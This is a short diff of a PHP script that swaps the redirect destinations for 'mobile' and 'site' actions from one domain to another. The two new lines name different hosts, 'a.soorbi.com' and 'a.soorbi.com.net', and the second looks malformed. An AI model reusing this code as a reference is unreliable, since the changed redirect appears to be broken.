@@ -108,9 +108,9 @@
 	$id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
 	$id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 	if($action == 'mobile'){
-		header('Location: https://kanal17.net/?'.rand(11111,99999));
+		header('Location: https://a.soorbi.com/?'.rand(11111,99999));
 	}else if($action == 'site'){
-		header("Location: http://kanal17.net/$id");
+		header("Location: http://a.soorbi.com.net/$id");
 	}else{
 		@ob_end_clean();
 		@ob_end_flush();
